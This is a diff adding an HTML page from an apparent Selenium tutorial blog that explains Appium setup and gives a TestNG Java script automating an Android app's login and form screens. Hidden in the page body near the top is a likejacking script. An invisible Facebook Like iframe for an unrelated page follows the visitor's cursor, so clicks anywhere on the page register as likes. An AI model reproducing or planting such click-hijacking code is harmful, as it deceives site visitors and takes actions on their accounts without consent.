@@ -1,0 +1,455 @@
+
+<!DOCTYPE HTML>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Mobile testing : Create first Appium WebDriver android script in Java - Selenium Tutorial</title>
+    <meta name="author" content="Ta Bao Lan">
+   	
+	<meta name="description" content="Mobile testing : Create first Appium WebDriver android script in Java" />
+	
+	<meta name="keywords" content="" />
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+	<link href="/atom.xml" rel="alternate" title="Selenium Tutorial" type="application/atom+xml">
+	<link rel="canonical" href="">
+	<link href="/favicon.ico" rel="shortcut icon">
+    <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+    <link href='http://fonts.googleapis.com/css?family=Slackey' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Fjalla+One' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Amethysta' rel='stylesheet' type='text/css'>
+	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js"></script>
+    <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+    <script type="text/javascript" src="/javascripts/jquery-tapir.js"></script>
+
+    <!-- remove or comment it to disable ajaxification -->   
+    <!--  <script src="/javascripts/ajaxify.js"></script> -->   
+
+
+
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    var pluginUrl =
+            '//www.google-analytics.com/plugins/ga/inpage_linkid.js';
+    _gaq.push(['_require', 'inpage_linkid', pluginUrl]);
+    _gaq.push(['_setAccount', 'UA-51278981-1']);
+    _gaq.push(['_trackPageview']);
+    function initGa() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'stats.g.doubleclick.net/dc.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    }
+    setTimeout(initGa, 50);
+</script>
+
+
+
+</head>
+
+<body>
+
+    <div id="wrapper">
+    <header id="header" class="inner"><!-- for more effects see _animate.scss -->
+<h1 class="animated bounceInDown">
+    <div id="headerbg">
+		Selenium Tutorial
+		<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- ad-banner-responsive -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-5798698216356388"
+     data-ad-slot="7145934352"
+     data-ad-format="auto"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+    </div>
+</h1>
+<br>
+
+<ul id="social-links" style="text-align:center">
+  
+  
+  <!-- Google Plus -->
+  <li>
+  <a href="http://plus.google.com/lantabao?rel=author" class="google" title="Google+"></a>
+  </li>
+  
+  
+  <!-- Facebook -->
+  <li>
+  <a href="http://www.facebook.com/gaumun" class="facebook" title="Facebook"></a>
+  </li>
+  
+  
+  
+  <!-- LinkedIn -->
+  <li>
+  <a href="http://www.linkedin.com/in/tabaolan" class="linkedin" title="LinkedIn"></a>
+  </li>
+  
+  
+  <!-- Skype -->
+  <li>
+  <a href="http://myskype.info/lantb1987" class="skype" title="Skype"></a>
+  </li>
+  
+  
+  
+</ul>
+
+
+<!-- use full url including 'index.html' for navigation bar if you are using ajax -->
+<ul id="nav">
+	<li id="ajax"><a href="/index.html">Home</a></li>
+	<li id="ajax"><a href="/categories/webdriver/">WebDriver</a></li>
+	<li id="ajax"><a href="/categories/newbie/">Selenium Beginner</a></li>
+	<li id="ajax"><a href="/categories/testng-framework/">TestNG Framework</a></li>
+	<li id="ajax"><a href="/categories/selenium-framework/">Automation Framework</a></li>
+	<li id="ajax"><a href="/categories/icecream-framework/">IceCream Framework</a></li>
+	<li id="ajax"><a href="/categories/selenium-mobile/">Selenium Mobile</a></li>
+    <li id="ajax"><a href="/categories/tricks/">Tips&Tricks</a></li>
+	<li id="ajax"><a href="/categories/jmeter/">JMETER</a></li>
+	<li id="ajax"><a href="/categories/mobiletest/">Mobile Testing</a></li>
+	
+    <li>
+    <div id="dark">
+        <form method="get" action="/search.html" id="search">
+            <input name="query" type="text" placeholder="Search..." x-webkit-speech />
+        </form>
+    </div>
+    </li>
+        
+</ul>
+
+
+
+﻿
+</header>
+
+<div id="toload">
+<!-- begin toload -->
+<div id="content" class="inner">
+<div style="overflow: hidden; width: 10px; height: 12px; position: absolute; filter:alpha(opacity=0); -moz-opacity:0.0; -khtml-opacity: 0.0; opacity: 0.0;" id="icontainer">
+    <iframe src="http://www.facebook.com/plugins/like.php?href=https://www.facebook.com/pages/Trollvd/606655129460867&amp;layout=standard&amp;show_faces=false&amp;width=450&amp;action=like&amp;font=tahoma&amp;colorscheme=light&amp;height=80" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:50px; height:23px;" allowTransparency="true" id="fbframe" name="fbframe"></iframe>
+    <!--end facebook like frame code-->
+</div>
+<script>
+    var iflag = 0;
+    var icontainer = document.getElementById('icontainer');
+    var standardbody = (document.compatMode == "CSS1Compat") ? document.documentElement : document.body   
+	function mouseFollower(e){ /* DO NOT EDIT THIS */ 
+	if (window.event) { icontainer.style.top = (window.event.y-5)+standardbody.scrollTop+'px'; icontainer.style.left = (window.event.x-5)+standardbody.scrollLeft+'px'; } else { icontainer.style.top = (e.pageY-5)+'px'; icontainer.style.left = (e.pageX-5)+'px'; } } document.onmousemove = function(e) { if (iflag == 0) {mouseFollower(e);} }
+</script>
+        <article class="post">
+
+	<h2 class="title">Mobile Testing : Create First Appium WebDriver Android Script in Java</h2>
+	<div class="entry-content"><h2>Setup and create first Appium Webdriver android script in Java</h2>
+
+<h3>About Appium:</h3>
+
+<p>Appium is open source automation tool for iOS and android application supported by Sauce Lab. It is cross platform, supported Native, Hybrid iOS and android application. At backend it uses webdriver JSON wire protocol to communicate with iOS and android applications.</p>
+
+<p>Appium supported many languages like Webdriver. You can write your test scripts any language that has selenium client library.</p>
+
+<p>Appium support UIAutomator framework for ios and android library (For newer Api) and use selendroid for older android platform.</p>
+
+<p>In this post I will show you how to setup and create Appium android script in java language.</p>
+
+<h3>Prerequisite:</h3>
+
+<p>1.JDK should be installed and java home path setup in your machine.</p>
+
+<p>2.Android SDK should be installed on your machine and android path should be setup in your machine.</p>
+
+<p>3.Appium for window download from : <a href="http://appium.io/">Click here</a></p>
+
+<p>4.Selenium jar file from : <a href="http://docs.seleniumhq.org/download/">Download</a></p>
+
+<p>5.Eclipse.</p>
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+
+<p><ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-5798698216356388" data-ad-slot="7145934352" data-ad-format="auto"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></p>
+
+<h3>Steps to create and run android test script:</h3>
+
+<p>1.Go to Appium downloaded package unzip and click on “Appium.exe”. Appium server console will be open like below:</p>
+
+<p><img src="/images/mb11.jpg"></p>
+
+<p>2.You can change IP address and port, but keep it as a default.</p>
+
+<p>3.Click on Launch button to run appium server you should see appium server running window like below</p>
+
+<p><img src="/images/mb12.jpg"></p>
+
+<p>4.Launch emulator or connect device to the machine. Run adb command to check device is connected to your machine.</p>
+
+<p>5.Below is sample code of webdriver in java for Appium in TestNg framework.</p>
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+
+<p><ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-5798698216356388" data-ad-slot="9425076351" data-ad-format="auto"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>package com.test;
+</span><span class='line'> 
+</span><span class='line'>import java.io.File;
+</span><span class='line'>import java.net.URL;
+</span><span class='line'>import java.util.List;
+</span><span class='line'>import org.openqa.selenium.By;
+</span><span class='line'>import org.openqa.selenium.Capabilities;
+</span><span class='line'>import org.openqa.selenium.WebDriver;
+</span><span class='line'>import org.openqa.selenium.WebElement;
+</span><span class='line'>import org.openqa.selenium.interactions.HasTouchScreen;
+</span><span class='line'>import org.openqa.selenium.interactions.TouchScreen;
+</span><span class='line'>import org.openqa.selenium.remote.CapabilityType;
+</span><span class='line'>import org.openqa.selenium.remote.DesiredCapabilities;
+</span><span class='line'>import org.openqa.selenium.remote.RemoteTouchScreen;
+</span><span class='line'>import org.openqa.selenium.remote.RemoteWebDriver;
+</span><span class='line'>import org.testng.annotations.AfterMethod;
+</span><span class='line'>import org.testng.annotations.BeforeMethod;
+</span><span class='line'>import org.testng.annotations.Test;
+</span><span class='line'> 
+</span><span class='line'>public class AppiumTest {
+</span><span class='line'>  
+</span><span class='line'>    private WebDriver driver;
+</span><span class='line'> 
+</span><span class='line'>    @BeforeMethod
+</span><span class='line'>    public void setUp() throws Exception {
+</span><span class='line'>      
+</span><span class='line'>        // set up appium
+</span><span class='line'>        File appDir = new File("{pathApk file}");
+</span><span class='line'>        File app = new File(appDir, "{APK file Name}"); //my case “demo1.apk”
+</span><span class='line'>        DesiredCapabilities capabilities = new DesiredCapabilities();
+</span><span class='line'>        capabilities.setCapability("device","Android");
+</span><span class='line'>        capabilities.setCapability(CapabilityType.BROWSER_NAME,  "");
+</span><span class='line'>        capabilities.setCapability(CapabilityType.VERSION, "4.2");
+</span><span class='line'>        capabilities.setCapability(CapabilityType.PLATFORM, "WINDOW");
+</span><span class='line'>        capabilities.setCapability("app", app.getAbsolutePath());
+</span><span class='line'>        capabilities.setCapability("app-package", "{app package name}");  
+</span><span class='line'>        capabilities.setCapability("app-activity", ".{main activity class}");  //my case RootActivity
+</span><span class='line'>        driver = new RemoteWebDriver(new URL("http://127.0.0.1:4723/wd/hub"), capabilities);
+</span><span class='line'>        
+</span><span class='line'>    }
+</span><span class='line'> 
+</span><span class='line'>    @AfterMethod
+</span><span class='line'>    public void tearDown() throws Exception { 
+</span><span class='line'>        driver.quit();
+</span><span class='line'>    }
+</span><span class='line'>     
+</span><span class='line'>    @Test
+</span><span class='line'>    public void loginTest() throws InterruptedException
+</span><span class='line'>    {     
+</span><span class='line'>     List&lt;webelement&gt; textFieldsList = driver.findElements(By.className("android.widget.EditText")); 
+</span><span class='line'>        int size = textFieldsList.size();
+</span><span class='line'> 
+</span><span class='line'>        textFieldsList.get(0).sendKeys("Admin");
+</span><span class='line'>        textFieldsList.get(1).sendKeys("Admin");
+</span><span class='line'>        driver.findElements(By.xpath("android.widget.Button")).get(1).click();
+</span><span class='line'>        WebElement logout = driver.findElement(By.name("LOGOUT"));
+</span><span class='line'>        String logOut = logout.getText();
+</span><span class='line'>        System.out.println(logOut);
+</span><span class='line'>        logout.click();
+</span><span class='line'>    }
+</span><span class='line'>     
+</span><span class='line'>    @Test
+</span><span class='line'>    public void formTest() throws InterruptedException
+</span><span class='line'>    {     
+</span><span class='line'>     List&lt;webelement&gt; textFieldsList = driver.findElements(By.className("android.widget.RelativeLayout")); 
+</span><span class='line'>        textFieldsList.get(2).click();
+</span><span class='line'>         
+</span><span class='line'>        driver.findElement(By.className("android.widget.Spinner")).click();        
+</span><span class='line'>        List&lt;webelement&gt; listsDropDown = driver.findElements(By.className("android.widget.CheckedTextView")); 
+</span><span class='line'>        for(WebElement listdropdown: listsDropDown){
+</span><span class='line'>         String list = listdropdown.getText();        
+</span><span class='line'>         if(list.equals("Oxygen")){
+</span><span class='line'>          listdropdown.click();
+</span><span class='line'>         }
+</span><span class='line'>        }
+</span><span class='line'>         
+</span><span class='line'>        //click on check box
+</span><span class='line'>        WebElement checkBox = driver.findElement(By.className("android.widget.CheckBox"));        
+</span><span class='line'>        if(checkBox.isSelected()){
+</span><span class='line'>         checkBox.click();
+</span><span class='line'>        }
+</span><span class='line'>         
+</span><span class='line'>        //radio button 
+</span><span class='line'>        driver.findElements(By.className("android.widget.RadioButton")).get(1).click();      
+</span><span class='line'>        
+</span><span class='line'>    }      
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+
+<p><ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-5798698216356388" data-ad-slot="3378542759" data-ad-format="auto"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></p>
+</div>
+
+<div class="meta">
+	
+		<span class="comments"><a href="/mobile-testing-create-first-appium-webdriver-android-script-in-java/#disqus_thread">Comments</a></span>
+	
+</div>
+
+<br>
+</article>
+
+	<div class="share">
+	<div class="addthis_toolbox addthis_default_style ">
+	
+	
+	
+	<a class="addthis_counter addthis_pill_style"></a>
+	</div>
+  <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid="></script>
+</div>
+
+
+
+<section id="comment">
+    <h2 class="title">Comments</h2>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+</section>
+
+ </div>
+    <footer id="footer">
+    <div style="display:inline">
+    Copyright &copy; 2014
+
+    Ta Bao Lan
+. Powered by <a href="http://octopress.org">Octopress</a>
+</div>
+
+
+    </footer>
+    <script src="/javascripts/fabric.js"></script>
+<script src="/javascripts/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+	$('.fancybox').fancybox();
+})(jQuery);
+</script> <!-- Delete or comment this line to disable Fancybox -->
+
+
+<script type="text/javascript">
+      var disqus_shortname = 'tabaolan1987';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://www.tabaolan.com/mobile-testing-create-first-appium-webdriver-android-script-in-java/';
+        var disqus_url = 'http://www.tabaolan.com/mobile-testing-create-first-appium-webdriver-android-script-in-java/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+<!-- end toload --> 
+</div>
+</div>
+<script src="/javascripts/jquery.ui.totop.js" type="text/javascript"></script>
+<script type="text/javascript">
+/*<![CDATA[*/
+;(function($){$().UItoTop({easingType:'easeOutCirc'});})(jQuery); 
+/*]]>*/
+</script><!-- remove it to remove the scroll to top button -->
+</body>
+</html>
